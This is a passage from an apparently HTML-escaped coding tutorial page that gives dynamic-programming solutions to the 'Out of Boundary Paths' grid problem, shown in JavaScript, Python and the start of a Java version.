        &lt;span class="nx"&gt;dpLast&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;Array&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="k"&gt;from&lt;/span&gt;&lt;span class="p"&gt;({&lt;/span&gt;&lt;span class="na"&gt;length&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="nx"&gt;m&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="mi"&gt;2&lt;/span&gt;&lt;span class="p"&gt;},&lt;/span&gt; &lt;span class="p"&gt;()&lt;/span&gt; &lt;span class="o"&gt;=&amp;gt;&lt;/span&gt; &lt;span class="k"&gt;new&lt;/span&gt; &lt;span class="nb"&gt;Uint32Array&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;n&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="mi"&gt;2&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;
    &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="kd"&gt;let&lt;/span&gt; &lt;span class="nx"&gt;i&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="nx"&gt;i&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;=&lt;/span&gt; &lt;span class="nx"&gt;m&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="nx"&gt;i&lt;/span&gt;&lt;span class="o"&gt;++&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
        &lt;span class="nx"&gt;dpCurr&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="nx"&gt;i&lt;/span&gt;&lt;span class="p"&gt;][&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;&lt;span class="o"&gt;++&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nx"&gt;dpCurr&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="nx"&gt;i&lt;/span&gt;&lt;span class="p"&gt;][&lt;/span&gt;&lt;span class="nx"&gt;n&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;&lt;span class="o"&gt;++&lt;/span&gt;
    &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="kd"&gt;let&lt;/span&gt; &lt;span class="nx"&gt;j&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="nx"&gt;j&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;=&lt;/span&gt; &lt;span class="nx"&gt;n&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="nx"&gt;j&lt;/span&gt;&lt;span class="o"&gt;++&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
        &lt;span class="nx"&gt;dpCurr&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;][&lt;/span&gt;&lt;span class="nx"&gt;j&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;&lt;span class="o"&gt;++&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nx"&gt;dpCurr&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="nx"&gt;m&lt;/span&gt;&lt;span class="p"&gt;][&lt;/span&gt;&lt;span class="nx"&gt;j&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;&lt;span class="o"&gt;++&lt;/span&gt;
    &lt;span class="kd"&gt;let&lt;/span&gt; &lt;span class="nx"&gt;ans&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nx"&gt;dpCurr&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="nx"&gt;startRow&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;][&lt;/span&gt;&lt;span class="nx"&gt;startColumn&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;
    &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="kd"&gt;let&lt;/span&gt; &lt;span class="nx"&gt;d&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="nx"&gt;d&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;&lt;/span&gt; &lt;span class="nx"&gt;maxMove&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="nx"&gt;d&lt;/span&gt;&lt;span class="o"&gt;++&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
        &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="nx"&gt;dpCurr&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nx"&gt;dpLast&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="nx"&gt;dpLast&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nx"&gt;dpCurr&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;
        &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="kd"&gt;let&lt;/span&gt; &lt;span class="nx"&gt;i&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="nx"&gt;i&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;=&lt;/span&gt; &lt;span class="nx"&gt;m&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="nx"&gt;i&lt;/span&gt;&lt;span class="o"&gt;++&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
            &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="kd"&gt;let&lt;/span&gt; &lt;span class="nx"&gt;j&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="nx"&gt;j&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;=&lt;/span&gt; &lt;span class="nx"&gt;n&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="nx"&gt;j&lt;/span&gt;&lt;span class="o"&gt;++&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
                &lt;span class="nx"&gt;dpCurr&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="nx"&gt;i&lt;/span&gt;&lt;span class="p"&gt;][&lt;/span&gt;&lt;span class="nx"&gt;j&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;dpLast&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="nx"&gt;i&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;][&lt;/span&gt;&lt;span class="nx"&gt;j&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="nx"&gt;dpLast&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="nx"&gt;i&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;][&lt;/span&gt;&lt;span class="nx"&gt;j&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="nx"&gt;dpLast&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="nx"&gt;i&lt;/span&gt;&lt;span class="p"&gt;][&lt;/span&gt;&lt;span class="nx"&gt;j&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="nx"&gt;dpLast&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="nx"&gt;i&lt;/span&gt;&lt;span class="p"&gt;][&lt;/span&gt;&lt;span class="nx"&gt;j&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;])&lt;/span&gt; &lt;span class="o"&gt;%&lt;/span&gt; &lt;span class="mi"&gt;1000000007&lt;/span&gt;
        &lt;span class="nx"&gt;ans&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;ans&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="nx"&gt;dpCurr&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="nx"&gt;startRow&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;][&lt;/span&gt;&lt;span class="nx"&gt;startColumn&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;])&lt;/span&gt; &lt;span class="o"&gt;%&lt;/span&gt; &lt;span class="mi"&gt;1000000007&lt;/span&gt;
    &lt;span class="p"&gt;}&lt;/span&gt;
    &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="nx"&gt;ans&lt;/span&gt;
&lt;span class="p"&gt;};&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;






&lt;h4&gt;
  &lt;a href="#python-code"&gt;
  &lt;/a&gt;
  &lt;strong&gt;&lt;em&gt;Python Code:&lt;/em&gt;&lt;/strong&gt;
&lt;/h4&gt;

&lt;p&gt;&lt;br&gt;(&lt;em&gt;Jump to&lt;/em&gt;: &lt;a href="#description"&gt;&lt;em&gt;Problem Description&lt;/em&gt;&lt;/a&gt; || &lt;a href="#idea"&gt;&lt;em&gt;Solution Idea&lt;/em&gt;&lt;/a&gt;)&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight python"&gt;&lt;code&gt;&lt;span class="k"&gt;class&lt;/span&gt; &lt;span class="nc"&gt;Solution&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
    &lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;findPaths&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;m&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="nb"&gt;int&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;n&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="nb"&gt;int&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;maxMove&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="nb"&gt;int&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;startRow&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="nb"&gt;int&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;startColumn&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="nb"&gt;int&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;-&amp;gt;&lt;/span&gt; &lt;span class="nb"&gt;int&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
        &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="n"&gt;maxMove&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;
        &lt;span class="n"&gt;dpCurr&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;[[&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;n&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="mi"&gt;2&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;_&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="nb"&gt;range&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;m&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="mi"&gt;2&lt;/span&gt;&lt;span class="p"&gt;)]&lt;/span&gt;
        &lt;span class="n"&gt;dpLast&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;[[&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;n&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="mi"&gt;2&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;_&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="nb"&gt;range&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;m&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="mi"&gt;2&lt;/span&gt;&lt;span class="p"&gt;)]&lt;/span&gt;
        &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;i&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="nb"&gt;range&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;m&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
            &lt;span class="n"&gt;dpCurr&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="p"&gt;][&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="o"&gt;+=&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;
            &lt;span class="n"&gt;dpCurr&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="p"&gt;][&lt;/span&gt;&lt;span class="n"&gt;n&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="o"&gt;+=&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;
        &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;j&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="nb"&gt;range&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;n&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
            &lt;span class="n"&gt;dpCurr&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;][&lt;/span&gt;&lt;span class="n"&gt;j&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="o"&gt;+=&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;
            &lt;span class="n"&gt;dpCurr&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;m&lt;/span&gt;&lt;span class="p"&gt;][&lt;/span&gt;&lt;span class="n"&gt;j&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="o"&gt;+=&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;
        &lt;span class="n"&gt;ans&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;dpCurr&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;startRow&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;][&lt;/span&gt;&lt;span class="n"&gt;startColumn&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;
        &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;d&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="nb"&gt;range&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;maxMove&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
            &lt;span class="n"&gt;dpCurr&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;dpLast&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;dpLast&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;dpCurr&lt;/span&gt;
            &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;j&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="n"&gt;product&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;range&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;m&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;),&lt;/span&gt; &lt;span class="nb"&gt;range&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;n&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;)):&lt;/span&gt;
                &lt;span class="n"&gt;dpCurr&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="p"&gt;][&lt;/span&gt;&lt;span class="n"&gt;j&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;dpLast&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;][&lt;/span&gt;&lt;span class="n"&gt;j&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="n"&gt;dpLast&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;][&lt;/span&gt;&lt;span class="n"&gt;j&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="n"&gt;dpLast&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="p"&gt;][&lt;/span&gt;&lt;span class="n"&gt;j&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="n"&gt;dpLast&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="p"&gt;][&lt;/span&gt;&lt;span class="n"&gt;j&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;])&lt;/span&gt; &lt;span class="o"&gt;%&lt;/span&gt; &lt;span class="mi"&gt;1000000007&lt;/span&gt;
            &lt;span class="n"&gt;ans&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;ans&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="n"&gt;dpCurr&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;startRow&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;][&lt;/span&gt;&lt;span class="n"&gt;startColumn&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;])&lt;/span&gt; &lt;span class="o"&gt;%&lt;/span&gt; &lt;span class="mi"&gt;1000000007&lt;/span&gt;
        &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="n"&gt;ans&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;






&lt;h4&gt;
  &lt;a href="#java-code"&gt;
  &lt;/a&gt;
  &lt;strong&gt;&lt;em&gt;Java Code:&lt;/em&gt;&lt;/strong&gt;
&lt;/h4&gt;

&lt;p&gt;&lt;br&gt;(&lt;em&gt;Jump to&lt;/em&gt;: &lt;a href="#description"&gt;&lt;em&gt;Problem Description&lt;/em&gt;&lt;/a&gt; || &lt;a href="#idea"&gt;&lt;em&gt;Solution Idea&lt;/em&gt;&lt;/a&gt;)&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight java"&gt;&lt;code&gt;&lt;span class="kd"&gt;class&lt;/span&gt; &lt;span class="nc"&gt;Solution&lt;/span&gt; &lt;span class="o"&gt;{&lt;/span&gt;
    &lt;span class="kd"&gt;public&lt;/span&gt; &lt;span class="kt"&gt;int&lt;/span&gt; &lt;span class="nf"&gt;findPaths&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="kt"&gt;int&lt;/span&gt; &lt;span class="n"&gt;m&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="kt"&gt;int&lt;/span&gt; &lt;span class="n"&gt;n&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="kt"&gt;int&lt;/span&gt; &lt;span class="n"&gt;maxMove&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="kt"&gt;int&lt;/span&gt; &lt;span class="n"&gt;startRow&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="kt"&gt;int&lt;/span&gt; &lt;span class="n"&gt;startColumn&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="o"&gt;{&lt;/span&gt;
        &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;maxMove&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt;
        &lt;span class="kt"&gt;int&lt;/span&gt;&lt;span class="o"&gt;[][]&lt;/span&gt; &lt;span class="n"&gt;dpCurr&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="k"&gt;new&lt;/span&gt; &lt;span class="kt"&gt;int&lt;/span&gt;&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="n"&gt;m&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="mi"&gt;2&lt;/span&gt;&lt;span class="o"&gt;][&lt;/span&gt;&lt;span class="n"&gt;n&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="mi"&gt;2&lt;/span&gt;&lt;span class="o"&gt;],&lt;/span&gt; &lt;span class="n"&gt;dpLast&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="k"&gt;new&lt;/span&gt; &lt;span class="kt"&gt;int&lt;/span&gt;&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="n"&gt;m&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="mi"&gt;2&lt;/span&gt;&lt;span class="o"&gt;][&lt;/span&gt;&lt;span class="n"&gt;n&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="mi"&gt;2&lt;/span&gt;&lt;span class="o"&gt;];&lt;/span&gt;
        &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="kt"&gt;int&lt;/span&gt; &lt;span class="n"&gt;i&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt; &lt;span class="n"&gt;i&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;=&lt;/span&gt; &lt;span class="n"&gt;m&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt; &lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="o"&gt;++)&lt;/span&gt; &lt;span class="o"&gt;{&lt;/span&gt;
            &lt;span class="n"&gt;dpCurr&lt;/span&gt;&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="o"&gt;][&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="o"&gt;]++;&lt;/span&gt;
            &lt;span class="n"&gt;dpCurr&lt;/span&gt;&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="o"&gt;][&lt;/span&gt;&lt;span class="n"&gt;n&lt;/span&gt;&lt;span class="o"&gt;]++;&lt;/span&gt;
        &lt;span class="o"&gt;}&lt;/span&gt;
        &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="kt"&gt;int&lt;/span&gt; &lt;span class="n"&gt;j&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt; &lt;span class="n"&gt;j&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;=&lt;/span&gt; &lt;span class="n"&gt;n&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt; &lt;span class="n"&gt;j&lt;/span&gt;&lt;span class="o"&gt;++)&lt;/span&gt; &lt;span class="o"&gt;{&lt;/span&gt;
            &lt;span class="n"&gt;dpCurr&lt;/span&gt;&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="o"&gt;][&lt;/span&gt;&lt;span class="n"&gt;j&lt;/span&gt;&lt;span class="o"&gt;]++;&lt;/span&gt;
            &lt;span class="n"&gt;dpCurr&lt;/span&gt;&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="n"&gt;m&lt;/span&gt;&lt;span class="o"&gt;][&lt;/span&gt;&lt;span class="n"&gt;j&lt;/span&gt;&lt;span class="o"&gt;]++;&lt;/span&gt;
